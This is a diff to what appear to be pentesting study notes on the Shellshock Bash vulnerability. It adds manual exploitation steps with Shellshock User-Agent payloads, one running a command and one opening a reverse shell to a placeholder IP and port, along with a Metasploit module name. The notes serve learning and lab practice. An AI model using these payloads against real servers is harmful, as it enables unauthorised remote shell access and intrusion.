@@ -24,6 +24,8 @@ Caused by a vulnerability in Bash, whereby *Bash mistakenly executes trailing co
 
 # Exploitation
 
+### Manual Exploitation
+
 1. Check if target is running Apache
 
 2. Check if Apache is vulnerable using nmap script
@@ -31,7 +33,25 @@ Caused by a vulnerability in Bash, whereby *Bash mistakenly executes trailing co
 nmap TARGET --script=http-shellshock --script-args "http-shellshock.uri=/PATH.cgi"
 ```
 
-3. 
+3. If vulnerable, use Burp and modify user agent of .cgi script request
+```HTTP
+User-Agent:() { :; }; echo; /bin/bash -c 'ls -la'
+```
+
+4. Set up listener on Attack machine, and connect with target
+```HTTP
+User-Agent:() { :; }; echo; /bin/bash -c 'bash -i>&/dev/tcp/IP/PORT 0>&1'
+```
+
+
+### Metasploit Exploitation
+
+1. Use exploit module 
+
+```bash
+msf> use exploit/multi/http/apache_mod_cgi_bash_env_exec
+```
+
 ---
 #### Definitions
 
